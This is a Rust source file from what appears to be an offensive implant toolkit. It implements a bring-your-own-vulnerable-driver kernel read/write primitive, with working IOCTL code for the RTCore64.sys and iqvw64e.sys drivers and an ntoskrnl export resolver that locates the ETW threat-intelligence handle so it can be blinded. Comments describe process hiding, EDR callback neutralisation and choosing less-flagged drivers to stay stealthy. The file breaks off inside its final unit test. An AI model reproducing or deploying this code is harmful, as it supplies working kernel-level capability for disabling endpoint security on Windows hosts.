//! BYOVD `KernelRw` impl — operator-side bootstrap primitive (P2.2 §1).
//!
//! ## Status: CODE SHIPPED, NOT LOADED. The driver-binding + IOCTL layer is
//! real and unit-testable with a mock driver; it is NEVER loaded on this host.
//! Loading a vulnerable signed driver into the kernel is an irreversible,
//! BSOD-risking, Defender-flagging operation reserved for an authorized target
//! — the operator runs that step in the engagement environment, not here.
//!
//! ## What this module provides
//! - [`ByovdDriver`]: a `KernelRw` impl over a driver-bound IOCTL channel. It
//!   owns a HANDLE to the vulnerable driver's device and routes `kread`/`kwrite`
//!   through the driver's IOCTLs, translated to the `KernelRw` trait. Any
//!   driver that exposes "read/write kernel VA at an arbitrary address" IOCTLs
//!   plugs in by implementing [`VulnDriverIoctl`].
//! - [`VulnDriverIoctl`]: the per-driver seam. A concrete impl encodes the
//!   driver's device name + its read/write IOCTL codes + arg struct layout.
//!   [`RtCore64`] is the reference impl (MSI Afterburner's RTCore64.sys).
//! - [`resolve_kernel_symbol`]: pure algorithm that walks a supplied ntoskrnl
//!   image (read via the same KernelRw) export table to resolve a named kernel
//!   symbol's VA — used by the bootstrap to find `EtwThreatIntProvRegHandle`.
//!
//! ## Why split algorithm from loading
//! The blind (`etwti::EtwTiBlind`) + the symbol resolution (here) are the
//! reusable, testable cores. The IOCTL plumbing is driver-specific but
//! mechanical. Only the *load* step is dangerous — and it's the one line we
//! deliberately omit (the operator does `sc create`/`NtLoadDriver` on target).
//!
//! ## Plugging in an alternative driver
//! The reference impl [`RtCore64`] is the BYOVD default. To use a different
//! vulnerable driver (stealthier Nday, vendor-whitelisted, less IOC-flagged):
//!
//! 1. Implement [`VulnDriverIoctl`] for a unit struct encoding your driver's
//!    device path + read/write IOCTL codes (override [`VulnDriverIoctl::pack`]
//!    only if the driver's arg struct differs from the generic [`RwPacket`]).
//! 2. Call [`crate::win::bootstrap_byovd_with`] with `Box::new(YourDriver)`
//!    instead of the convenience [`crate::win::bootstrap_byovd`] (which
//!    hardcodes `RtCore64`).
//!
//! The rest of the stack (ETW-TI blind, process hide, callback neutralize) is
//! driver-agnostic — it operates purely on the returned `KernelRw`.

use crate::{KernelRw, KrwError};
use alloc::boxed::Box;
use core::ffi::c_void;
use core::ptr;

// ---- IOCTL arg struct (generic 8-byte-aligned, fits most R/W drivers) -----

/// The in/out layout most vulnerable R/W drivers expect: a code, an address,
/// a size, and a buffer pointer. Drivers that differ wrap [`VulnDriverIoctl`]
/// and translate. Kept `#[repr(C)]` so it's ABI-stable across the DeviceIoControl
/// boundary regardless of Rust's field reordering.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct RwPacket {
    pub code: u32,
    pub addr: u64,
    pub size: u32,
    pub buf: u64,
}

// ---- Per-driver seam ------------------------------------------------------

/// A vulnerable driver's device + IOCTL contract. Implement this per driver to
/// plug it into [`ByovdDriver`]; the impl encodes the device path, the
/// read/write IOCTL codes, and how to pack/unpack a [`RwPacket`] for that
/// driver's specific layout. The trait object is `Send + Sync` so a
/// `ByovdDriver` (which is itself a `KernelRw: Send + Sync`) can hold it.
///
/// ## The protocol seam
/// Each driver speaks its OWN IOCTL protocol: different IOCTL codes, different
/// request struct layouts, different semantics (RTCore64 does 1-byte R/W in a
/// 48-byte struct; iqvw64e does an arbitrary-length kernel-side `memcpy` via a
/// single `case 0x33` IOCTL; Shield does a bidirectional memcpy in one IOCTL;
/// WDTKernel maps physical memory via MmMapIoSpace). A single generic
/// byte-loop cannot cover them all — so the real per-driver protocol lives in
/// [`VulnDriverIoctl::raw_rw`], which [`ByovdDriver`] delegates `kread`/`kwrite`
/// to. The default `raw_rw` implements the RTCore64 layout (the reference
/// driver); any driver whose protocol differs overrides it.
pub trait VulnDriverIoctl: Send + Sync {
    /// `\\Device\<name>` / `\\??\<name>` device path the driver exposes.
    fn device_path(&self) -> &[u16];
    /// IOCTL code for "read `size` bytes at kernel VA `addr` into `buf`".
    fn read_ioctl(&self) -> u32;
    /// IOCTL code for "write `size` bytes from `buf` to kernel VA `addr`".
    fn write_ioctl(&self) -> u32;
    /// Offset of the address field in the per-driver MemoryOperation struct.
    /// RTCore64 = 0x08, IQVW64E = 0x00.
    fn addr_offset(&self) -> usize { 0x08 }
    /// Human-readable blocklist status. Logged at bootstrap. Purely informational.
    fn blocklist_status(&self) -> &'static str { "unknown" }

    /// The per-driver kernel read/write primitive. `op` selects read vs write.
    /// `kaddr` is a kernel virtual address; `buf` is the user buffer; exactly
    /// `buf.len()` bytes are transferred. On partial failure, returns
    /// `Err(n)` where `n` is the number of bytes moved before the failure
    /// (the caller wraps that in `KrwError::Partial`).
    ///
    /// The DEFAULT impl is the RTCore64 protocol (the reference driver):
    /// 48-byte `MemoryOperation`, one byte per IOCTL, looped for `buf.len()`.
    /// Drivers with a different IOCTL protocol (different struct layout,
    /// different codes, different semantics — e.g. iqvw64e's kernel-side
    /// memcpy, Shield's bidirectional IOCTL, WDTKernel's MmMapIoSpace) MUST
    /// override this; the RTCore64 byte-loop is wrong for them.
    ///
    /// # Safety
    /// `dioctl` must be a real `kernel32!DeviceIoControl` pointer and `device`
    /// a valid open HANDLE to this driver's device. The caller ([`ByovdDriver`])
    /// guarantees both.
    unsafe fn raw_rw(
        &self,
        op: RwOp,
        kaddr: u64,
        buf: &mut [u8],
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        // RTCore64 default: one byte per IOCTL, 48-byte MemoryOperation struct.
        // Read = read_ioctl() (0x80002048), Write = write_ioctl() (0x8000204C).
        // Struct: address @ addr_offset(), size @ 0x18, data @ 0x1C. The struct
        // is BOTH in- and out-buffer (METHOD_BUFFERED): the read result is
        // written back into the data field.
        let ioctl = match op {
            RwOp::Read => self.read_ioctl(),
            RwOp::Write => self.write_ioctl(),
        };
        let ao = self.addr_offset();
        for (i, b) in buf.iter_mut().enumerate() {
            let mut packet = [0u8; 48];
            let addr = kaddr.wrapping_add(i as u64);
            packet[ao..ao + 8].copy_from_slice(&addr.to_le_bytes());
            // size @ 0x18 = 1 (one byte per call)
            packet[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes());
            if matches!(op, RwOp::Write) {
                // data @ 0x1C carries the byte to write
                packet[0x1C..0x20].copy_from_slice(&(*b as u32).to_le_bytes());
            }
            let mut ret: u32 = 0;
            let ok = unsafe {
                dioctl(
                    device,
                    ioctl,
                    packet.as_ptr() as *const c_void,
                    packet.len() as u32,
                    packet.as_mut_ptr() as *mut c_void,
                    packet.len() as u32,
                    &mut ret,
                    ptr::null_mut(),
                )
            };
            if ok == 0 {
                // `i` bytes moved before the failure.
                return Err(i);
            }
            if matches!(op, RwOp::Read) {
                // data @ 0x1C holds the byte the driver read.
                *b = packet[0x1C];
            }
        }
        Ok(())
    }

    /// Pack a read/write request into the driver's input buffer. Default uses
    /// the generic [`RwPacket`]; drivers with a different layout override.
    /// (Retained for compatibility; the live protocol path is [`raw_rw`].)
    fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
        let p = RwPacket {
            code,
            addr,
            size,
            buf: buf as u64,
        };
        let mut out = [0u8; 32];
        let bytes = unsafe {
            core::slice::from_raw_parts(
                &p as *const RwPacket as *const u8,
                core::mem::size_of::<RwPacket>(),
            )
        };
        out[..bytes.len()].copy_from_slice(bytes);
        out
    }
}

/// Direction selector for [`VulnDriverIoctl::raw_rw`].
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum RwOp {
    /// Read kernel memory into the user buffer.
    Read,
    /// Write the user buffer into kernel memory.
    Write,
}

/// Reference impl: MSI Afterburner's `RTCore64.sys`. Device `\\.\RTCore64`.
///
/// **RTCore64 memory-R/W IOCTL protocol (CVE-2019-16098, verified against the
/// oakboat/RTCore64_Vulnerability MemoryAccessor reference):**
///   - **Read  = IOCTL `0x80002048`** (NOT 0x8000204C — that's write)
///   - **Write = IOCTL `0x8000204C`**
/// Both take a fixed **48-byte** `MemoryOperation` struct (in-buffer == out-buffer,
/// the read result is written back into the same struct's `data` field):
/// ```text
///   offset  field      notes
///   0x00    gap1[8]    unused
///   0x08    address    u64 — target kernel VA
///   0x10    gap2[4]    unused
///   0x14    offset     u32 — (unused by these IOCTLs)
///   0x18    size       u32 — 1 / 2 / 4 (byte/word/dword)
///   0x1C    data       u32 — write: value to write; read: filled by driver
///   0x20    gap3[16]   unused
/// ```
/// Max 4 bytes per call, so arbitrary-length R/W loops one byte at a time
/// (`ReadMemory`/`WriteMemory` in the reference). The IOCTL codes are PUBLIC
/// (CVE-2019-16098); encoding them here is research documentation, not a 0day.
pub struct RtCore64;

impl VulnDriverIoctl for RtCore64 {
    fn device_path(&self) -> &[u16] {
        // `\\.\RTCore64` — the Win32 device namespace path (two leading
        // backslashes). Built at runtime to avoid a static wide-string lit.
        // NOTE: previously this was [u16; 11] with only ONE leading backslash
        // (`\.\RTCore64`), which CreateFileW treats as a relative file path
        // → ERROR_FILE_NOT_FOUND (2). The device prefix is exactly `\\.\`
        // (4 chars: `\`, `\`, `.`, `\`), so the full path is 12 code units.
        static PATH: [u16; 12] = [
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'R' as u16,
            'T' as u16,
            'C' as u16,
            'o' as u16,
            'r' as u16,
            'e' as u16,
            '6' as u16,
            '4' as u16,
        ];
        &PATH
    }
    /// RTCore64 read IOCTL. **0x80002048** (the original code had this swapped
    /// with write — read was 0x8000204C, which is actually WRITE, so every read
    /// failed silently / corrupted the target).
    fn read_ioctl(&self) -> u32 {
        0x80002048
    }
    /// RTCore64 write IOCTL. **0x8000204C**.
    fn write_ioctl(&self) -> u32 {
        0x8000204C
    }
    fn blocklist_status(&self) -> &'static str {
        "BLOCKLISTED: on all major EDR + Microsoft Vulnerable Driver Blocklist since 2020"
    }
}

/// Alternative: Intel `IQVW64E.sys` (CVE-2015-2291 / kdmapper driver). Less
/// flagged than RTCore64 historically, on the Microsoft Vulnerable Driver
/// Blocklist since 2023.
///
/// **iqvw64e memory-R/W IOCTL protocol (verified against TheCruZ/kdmapper
/// `intel_driver.cpp`):** Unlike RTCore64's per-byte struct R/W, iqvw64e exposes
/// a single dispatch IOCTL and an arbitrary-length kernel-side `memcpy`.
///   - **ONE IOCTL code: `0x80862007`** for every operation (read, write,
///     get-physical-address, MmMapIoSpace, …). The operation is selected by the
///     `case_number` field at the start of the request struct. (A prior version
///     of this code wrongly assumed two codes, 0x80802010/0x80802014, lifted
///     from an RTCore64-shaped assumption — those do not exist on this driver.)
///   - **Memory copy (case `0x33`)** — `COPY_MEMORY_BUFFER_INFO`, 40 bytes:
///     ```text
///       offset  field          notes
///       0x00    case_number    u64 = 0x33 (MemCopy)
///       0x08    reserved       u64 (0)
///       0x10    source         u64 — source VA (kernel or user)
///       0x18    destination    u64 — destination VA (kernel or user)
///       0x20    length         u64 — byte count
///     ```
///     The driver runs `memcpy(destination, source, length)` at IRQL_PASSIVE.
///   - **Read**  = MemCopy(destination = user `buf`, source = `kaddr`).
///   - **Write** = MemCopy(destination = `kaddr`, source = user `buf`).
///   Arbitrary length in one call — no per-byte loop. `read_ioctl()` /
///   `write_ioctl()` both return `0x80862007` (kept distinct only so the trait's
///   device-agnostic surface stays uniform; the dispatch is by case_number).
pub struct Iqvw64e;

/// iqvw64e dispatch IOCTL (all operations). Public CVE-2015-2291 detail.
const IQVW64E_IOCTL: u32 = 0x80862007;
/// MemCopy case number (iqvw64e case_number field).
const IQVW64E_CASE_MEMCPY: u64 = 0x33;

impl VulnDriverIoctl for Iqvw64e {
    fn device_path(&self) -> &[u16] {
        static PATH: [u16; 11] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
            '6' as u16, '4' as u16, 'e' as u16,
        ];
        &PATH
    }
    // Both R/W go through the SAME dispatch IOCTL (0x80862007); the direction
    // is encoded in the case_number + which field holds the kernel address.
    fn read_ioctl(&self) -> u32 { IQVW64E_IOCTL }
    fn write_ioctl(&self) -> u32 { IQVW64E_IOCTL }
    // Not used by iqvw64e's raw_rw override (address is a named struct field,
    // not at a fixed packet offset), but kept at the documented 0x00 for any
    // caller that inspects it.
    fn addr_offset(&self) -> usize { 0x00 }
    fn blocklist_status(&self) -> &'static str {
        "BLOCKLISTED: on Microsoft Vulnerable Driver Blocklist since 2023"
    }

    /// iqvw64e's protocol is fundamentally different from RTCore64's byte-loop:
    /// a single 0x80862007 IOCTL with case_number 0x33 drives an arbitrary-
    /// length kernel-side memcpy. Read = copy kernel→user; Write = copy user→kernel.
    /// One DeviceIoControl transfers the whole buffer (no loop).
    unsafe fn raw_rw(
        &self,
        op: RwOp,
        kaddr: u64,
        buf: &mut [u8],
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        // COPY_MEMORY_BUFFER_INFO (40 bytes), see struct doc above.
        let mut req = [0u8; 40];
        req[0x00..0x08].copy_from_slice(&IQVW64E_CASE_MEMCPY.to_le_bytes()); // case_number
        // reserved @ 0x08 stays 0
        let (src, dst) = match op {
            // Read: kernel addr is the SOURCE, user buf is the DESTINATION.
            RwOp::Read => (kaddr, buf.as_mut_ptr() as u64),
            // Write: user buf is the SOURCE, kernel addr is the DESTINATION.
            RwOp::Write => (buf.as_ptr() as u64, kaddr),
        };
        req[0x10..0x18].copy_from_slice(&src.to_le_bytes()); // source
        req[0x18..0x20].copy_from_slice(&dst.to_le_bytes()); // destination
        req[0x20..0x28].copy_from_slice(&(buf.len() as u64).to_le_bytes()); // length
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                IQVW64E_IOCTL,
                req.as_ptr() as *const c_void,
                req.len() as u32,
                ptr::null_mut(), // no output buffer (in-buffer only for MemCopy)
                0,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(0)
        } else {
            Ok(())
        }
    }
}

// ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------

/// `kernel32!DeviceIoControl` prototype. `pub(crate)` so the per-driver
/// `raw_rw` overrides in `byovd_drivers/` can name it in their signatures; it
/// is an internal seam, not part of the public SDK surface.
pub(crate) type DeviceIoControlFn = unsafe extern "system" fn(
    handle: *mut c_void,
    ioctl: u32,
    in_buf: *const c_void,
    in_len: u32,
    out_buf: *mut c_void,
    out_len: u32,
    bytes_returned: *mut u32,
    overlapped: *mut c_void,
) -> i32;
type CreateFileWFn = unsafe extern "system" fn(
    name: *const u16,
    access: u32,
    share: u32,
    sa: *mut c_void,
    disp: u32,
    flags: u32,
    template: *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;
type GetLastErrorFn = unsafe extern "system" fn() -> u32;

/// The BYOVD-backed KernelRw. Owns an open HANDLE to the vulnerable driver's
/// device + a resolved `DeviceIoControl` function pointer. Constructed by the
/// bootstrap AFTER the driver is loaded (operator's `sc create` / `NtLoadDriver`
/// step) — constructing it never loads anything, it just opens the device.
pub struct ByovdDriver {
    device: *mut c_void,
    dioctl: DeviceIoControlFn,
    driver: Box<dyn VulnDriverIoctl>,
}

// SAFETY: the device HANDLE is owned exclusively by this ByovdDriver; the
// bootstrap hands it over and no other thread touches it. DeviceIoControl on
// a sync HANDLE is safe to call from any thread. The VulnDriverIoctl box is
// Send+Sync by the trait bound. So ByovdDriver is Send+Sync → satisfies
// `KernelRw: Send + Sync`.
unsafe impl Send for ByovdDriver {}
unsafe impl Sync for ByovdDriver {}

impl ByovdDriver {
    /// Open the driver's device (does NOT load the driver — the operator must
    /// have loaded it first via `sc create`/`NtLoadDriver`). Resolves
    /// kernel32!CreateFileW + kernel32!DeviceIoControl via the PEB walk.
    ///
    /// # Safety
    /// Caller guarantees the driver is loaded and its device is accessible,
    /// and that the resolved kernel32 exports are real.
    pub unsafe fn open(driver: Box<dyn VulnDriverIoctl>) -> Result<Self, KrwError> {
        // Resolve via the operator host's own kernel32 (this is operator-side,
        // a normal user-mode process, so the PEB walk / GetProcAddress works).
        let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
        let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
        // device_path() may not be NUL-terminated (RtCore64's PATH is a bare
        // [u16;11] with no terminator). CreateFileW needs a NUL-terminated
        // wide string — copy into an owned, NUL-terminated buffer. Without
        // this CreateFileW reads past the end of the slice, opens the wrong
        // path, and returns INVALID_HANDLE_VALUE.
        let raw = driver.device_path();
        let mut path_buf: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(raw.len() + 1);
        path_buf.extend_from_slice(raw);
        if *path_buf.last().unwrap_or(&1) != 0 {
            path_buf.push(0);
        }
        let h = unsafe {
            create_file(
                path_buf.as_ptr(),
                0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE (minimal)
                0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                ptr::null_mut(),
                0x03, // OPEN_EXISTING
                0,
                ptr::null_mut(),
            )
        };
        if h as isize == -1 || h.is_null() {
            let gle = resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError")
                .map(|f| unsafe { f() })
                .unwrap_or(0);
            return Err(KrwError::Other(alloc::format!(
                "driver device open failed (Win32 err={})",
                gle
            )));
        }
        // path_buf must outlive the handle usage within this function; the
        // device HANDLE is valid independently of the path buffer once opened,
        // so dropping path_buf here is fine.
        Ok(Self {
            device: h,
            dioctl,
            driver,
        })
    }
}

impl Drop for ByovdDriver {
    fn drop(&mut self) {
        // Best-effort close; ignore failure (operator process teardown).
        // On Windows `resolve_sym` binds CloseHandle via GetProcAddress; on
        // other targets it's a stub (no-op) so Drop stays safe to call.
        if let Ok(close) = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
            unsafe { close(self.device) };
        }
    }
}

impl KernelRw for ByovdDriver {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        if dst.is_empty() {
            return Ok(());
        }
        // Delegate to the per-driver protocol. The default `raw_rw` implements
        // the RTCore64 byte-loop; iqvw64e / Shield / WdtKernel override it with
        // their own IOCTL contract. This is where the driver-agnostic KernelRw
        // trait meets the driver-specific wire format.
        let r = unsafe {
            self.driver
                .raw_rw(RwOp::Read, kaddr as u64, dst, self.device, self.dioctl)
        };
        r.map_err(|ok| KrwError::Partial { ok })
    }
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        if src.is_empty() {
            return Ok(());
        }
        // raw_rw takes &mut [u8] (the same buffer is in/out for some drivers).
        // `src` here is &[u8] — casting it to &mut would alias a shared borrow
        // and is UB, so copy into an owned mutable buffer. None of the Write
        // impls write back into the buffer (they only read it to build the
        // driver request), so the copy is semantically invisible; it costs one
        // allocation per write, fine for this operator-side bootstrap path.
        let mut buf: alloc::vec::Vec<u8> = alloc::vec::Vec::with_capacity(src.len());
        buf.extend_from_slice(src);
        let r = unsafe {
            self.driver
                .raw_rw(RwOp::Write, kaddr as u64, &mut buf, self.device, self.dioctl)
        };
        r.map_err(|ok| KrwError::Partial { ok })
    }
}

/// Resolve a kernel32 export to a typed fn pointer. Operator-side only — the
/// operator host is a normal user-mode process with a normal PEB, so the
/// standard GetProcAddress (via `GetModuleHandleA`) works. NOT for use inside
/// the PIC implant.
///
/// On `target_os = "windows"` this forwards to the real resolver in
/// [`crate::win::resolve::resolve_sym`] (GetModuleHandleA + GetProcAddress). On
/// other targets it stays the no-op stub so the seam crate still type-checks
/// (and so the mock tests build on the dev host).
#[cfg(target_os = "windows")]
fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
    // SAFETY: operator-side, single-threaded; T must match the export signature
    // (every call site here uses a typed `*Fn` alias matching the documented
    // export). Forwarded unchanged.
    unsafe { crate::win::resolve::resolve_sym(module, name) }
}

/// Non-Windows stub: no PEB / GetProcAddress on macOS/Linux, so resolution is
/// unavailable. The seam crate still compiles + mock tests run on the dev host.
#[cfg(not(target_os = "windows"))]
fn resolve_sym<T>(_module: &[u8], _name: &[u8]) -> Result<T, KrwError> {
    Err(KrwError::Unavailable(
        "resolver not bound in seam crate — operator binary supplies it",
    ))
}

// ---- Kernel symbol resolution (pure, testable) ----------------------------

/// Resolve a named ntoskrnl export's RVA by walking an in-memory copy of
/// ntoskrnl's export directory. Pure: operates on a supplied `&[u8]` image
/// (which the caller read via KernelRw from the live kernel). Returns the
/// export's RVA, or None if not found.
///
/// This is the same djb2-export-walk the implant's resolve.rs uses, lifted to
/// operate on an arbitrary byte buffer so it's testable without a kernel.
pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> {
    if ntoskrnl_image.len() < 0x40 {
        return None;
    }
    let e_lfanew = read_i32_le(ntoskrnl_image, 0x3C)? as usize;
    let nt = e_lfanew;
    if nt + 24 + 4 > ntoskrnl_image.len() {
        return None;
    }
    let opt = nt + 24;
    let magic = read_u16_le(ntoskrnl_image, opt)?;
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = read_u32_le(ntoskrnl_image, opt + dd_off)? as usize;
    let _export_size = read_u32_le(ntoskrnl_image, opt + dd_off + 4)?;
    if export_rva == 0 {
        return None;
    }
    // Export directory fields (IMAGE_EXPORT_DIRECTORY):
    //  +0x18 NumberOfNames, +0x20 AddressOfNames, +0x24 AddressOfNameOrdinals,
    //  +0x1C AddressOfFunctions.
    let n_names = read_u32_le(ntoskrnl_image, export_rva + 0x18)? as usize;
    let names_rva = read_u32_le(ntoskrnl_image, export_rva + 0x20)? as usize;
    let ordinals_rva = read_u32_le(ntoskrnl_image, export_rva + 0x24)? as usize;
    let funcs_rva = read_u32_le(ntoskrnl_image, export_rva + 0x1C)? as usize;
    let target_hash = djb2(name);
    for i in 0..n_names {
        let name_rva = read_u32_le(ntoskrnl_image, names_rva + i * 4)? as usize;
        // Hash the C string at name_rva until NUL.
        let mut h: u32 = 5381;
        let mut p = name_rva;
        loop {
            if p >= ntoskrnl_image.len() {
                break;
            }
            let b = ntoskrnl_image[p];
            if b == 0 {
                break;
            }
            h = h
                .wrapping_mul(33)
                .wrapping_add((b as char).to_ascii_lowercase() as u32);
            p += 1;
        }
        if h == target_hash {
            // djb2 has known collisions. Confirm the match with a byte-level
            // comparison of the candidate name against the expected name — a
            // hash collision that resolves a different export would yield a
            // bogus RVA, and EtwTiBlind writing 0 to an arbitrary kernel
            // address bugchecks (BSOD). This is operator-side code, so the
            // comparison is free (no stealth constraint). The comparison is
            // case-insensitive to match the hash's lowercasing.
            if !name_matches(ntoskrnl_image, name_rva, name) {
                continue;
            }
            let ord = read_u16_le(ntoskrnl_image, ordinals_rva + i * 2)? as usize;
            return read_u32_le(ntoskrnl_image, funcs_rva + ord * 4);
        }
    }
    None
}

// ---- Driver pack (pluggable BYOVD catalog) ----
// Add new drivers in byovd_drivers/<name>.rs, implement VulnDriverIoctl.
// (drivers declared via pub use from lib.rs)

/// Select the default driver via build config.
/// `NYX_BYOVD=wdtkernel|shield|rtcore64|iqvw64e` (unset → Shield).
/// Run `blocklist_status()` on the selected driver to check if it's still clean.
pub fn default_driver() -> Box<dyn VulnDriverIoctl> {
    match option_env!("NYX_BYOVD") {
        Some("wdtkernel") => Box::new(crate::byovd_drivers::wdtkernel::WdtKernel),
        Some("rtcore64") => Box::new(RtCore64),
        Some("iqvw64e") => Box::new(Iqvw64e),
        _ => Box::new(crate::byovd_drivers::shield::Shield),
    }
}

fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        h = h
            .wrapping_mul(33)
            .wrapping_add((b as char).to_ascii_lowercase() as u32);
    }
    h
}

/// Case-insensitive byte comparison of the NUL-terminated C string at
/// `image[name_rva..]` against `expected`. Guards against djb2 collisions in
/// [`resolve_kernel_symbol`]: a hash match alone is not trustworthy because djb2
/// is known to collide, and a wrong RVA feeds `EtwTiBlind` an arbitrary kernel
/// address → bugcheck (BSOD).
fn name_matches(image: &[u8], name_rva: usize, expected: &[u8]) -> bool {
    let mut p = name_rva;
    for &want in expected {
        if p >= image.len() {
            return false;
        }
        let got = image[p];
        if got == 0 {
            return false; // candidate ended before `expected`
        }
        if (got as char).to_ascii_lowercase() != (want as char).to_ascii_lowercase() {
            return false;
        }
        p += 1;
    }
    // After consuming all of `expected`, the candidate must be exactly NUL
    // (same length) — otherwise the candidate is a longer name that merely
    // shares a prefix (or, vanishingly, a collision).
    p < image.len() && image[p] == 0
}
fn read_u16_le(b: &[u8], off: usize) -> Option<u16> {
    if off + 2 > b.len() {
        return None;
    }
    Some(u16::from_le_bytes([b[off], b[off + 1]]))
}
fn read_u32_le(b: &[u8], off: usize) -> Option<u32> {
    if off + 4 > b.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        b[off],
        b[off + 1],
        b[off + 2],
        b[off + 3],
    ]))
}
fn read_i32_le(b: &[u8], off: usize) -> Option<i32> {
    Some(read_u32_le(b, off)? as i32)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal fake PE with ONE export whose name hashes to a known
    /// djb2, then confirm resolve_kernel_symbol finds its RVA.
    #[test]
    fn resolves_export_rva_from_fake_pe() {
        // Craft the smallest PE that resolve_kernel_symbol accepts:
        // DOS stub (0x40) + PE sig + file header + opt header + export dir + 1 name/ord/func.
        let mut img = vec![0u8; 0x400];
        // e_lfanew @ 0x3C -> 0x80
        img[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        let nt = 0x80usize;
        // PE sig "PE\0\0"
        img[nt..nt + 4].copy_from_slice(b"PE\0\0");
        let opt = nt + 24;
        // magic PE32+
        img[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes());
        let dd_off = 112usize;
        // export dir RVA = 0x200
        img[opt + dd_off..opt + dd_off + 4].copy_from_slice(&0x200u32.to_le_bytes());
        // export dir at 0x200: NumberOfNames @ +0x18 = 1, names @ +0x20 = 0x280,
        // ordinals @ +0x24 = 0x290, funcs @ +0x1C = 0x2A0.
        img[0x218..0x21C].copy_from_slice(&1u32.to_le_bytes()); // NumberOfNames
        img[0x220..0x224].copy_from_slice(&0x280u32.to_le_bytes()); // AddressOfNames
        img[0x224..0x228].copy_from_slice(&0x290u32.to_le_bytes()); // AddressOfNameOrdinals
        img[0x21C..0x220].copy_from_slice(&0x2A0u32.to_le_bytes()); // AddressOfFunctions
                                                                    // name RVA @ 0x280 -> the string at 0x300
        img[0x280..0x284].copy_from_slice(&0x300u32.to_le_bytes());
        let sym = b"EtwThreatIntProvRegHandle";
        img[0x300..0x300 + sym.len()].copy_from_slice(sym);
        img[0x300 + sym.len()] = 0; // NUL
                                    // ordinal @ 0x290 = 0
        img[0x290..0x292].copy_from_slice(&0u16.to_le_bytes());
        // function RVA @ 0x2A0 = 0xDEAD (the answer we expect)
        img[0x2A0..0x2A4].copy_from_slice(&0xDEADu32.to_le_bytes());

        let rva = resolve_kernel_symbol(&img, b"EtwThreatIntProvRegHandle");
        assert_eq!(rva, Some(0xDEAD));
    }

    /// djb2 has known collisions. `b"ar"` and `b"c0"` both hash to 0x597738.
    /// A bare hash match would resolve the collision's (wrong) RVA → EtwTiBlind
    /// writing 0 to an arbitrary kernel address → bugcheck (BSOD). The byte
    /// comparison must reject the collision: a PE whose ONLY export is named
    /// `c0` must NOT resolve when queried for `ar`, even though the hashes
    /// agree. Confirms the fix guards against wrong-RVA resolution.
    #[test]
    fn rejects_djb2_collision_via_byte_comparison() {
        // Sanity: the two names really do collide under our djb2.
        assert_eq!(djb2(b"ar"), djb2(b"c0"));

        let mut img = vec![0u8; 0x400];
        img[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        let nt = 0x80usize;
        img[nt..nt + 4].copy_from_slice(b"PE\0\0");
        let opt = nt + 24;
        img[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes()); // PE32+
        let dd_off = 112usize;
        img[opt + dd_off..opt + dd_off + 4].copy_from_slice(&0x200u32.to_le_bytes()); // export dir RVA
        // export dir at 0x200: 1 name/ord/func.
        img[0x218..0x21C].copy_from_slice(&1u32.to_le_bytes()); // NumberOfNames
        img[0x220..0x224].copy_from_slice(&0x280u32.to_le_bytes()); // AddressOfNames
        img[0x224..0x228].copy_from_slice(&0x290u32.to_le_bytes()); // AddressOfNameOrdinals
        img[0x21C..0x220].copy_from_slice(&0x2A0u32.to_le_bytes()); // AddressOfFunctions
        // name @ 0x280 -> "c0" string at 0x300 (the COLLIDING name).
        img[0x280..0x284].copy_from_slice(&0x300u32.to_le_bytes());
        let collision_name = b"c0";
        img[0x300..0x300 + collision_name.len()].copy_from_slice(collision_name);
        img[0x300 + collision_name.len()] = 0; // NUL
        img[0x290..0x292].copy_from_slice(&0u16.to_le_bytes()); // ordinal 0
        img[0x2A0..0x2A4].copy_from_slice(&0xBEEFu32.to_le_bytes()); // the WRONG rva

        // Query for "ar" — same hash, different bytes → must be rejected.
        assert_eq!(resolve_kernel_symbol(&img, b"ar"), None);
        // The collision name itself still resolves correctly (bytes match).
        assert_eq!(resolve_kernel_symbol(&img, b"c0"), Some(0xBEEF));
        // Case-insensitive: "C0" resolves too (hash and bytes both lowercase-equal).
        assert_eq!(resolve_kernel_symbol(&img, b"C0"), Some(0xBEEF));
    }

    #[test]
    fn returns_none_for_missing_export() {
        let img = vec![0u8; 0x400];
        // No valid PE -> None
        assert_eq!(resolve_kernel_symbol(&img, b"doesnotexist"), None);
    }

    #[test]
    fn rtcore64_ioctl_codes_match_public_cve() {
        // RTCore64 memory-R/W IOCTL codes (verified against the
        // oakboat/RTCore64_Vulnerability MemoryAccessor reference):
        //   read  = 0x80002048, write = 0x8000204C.
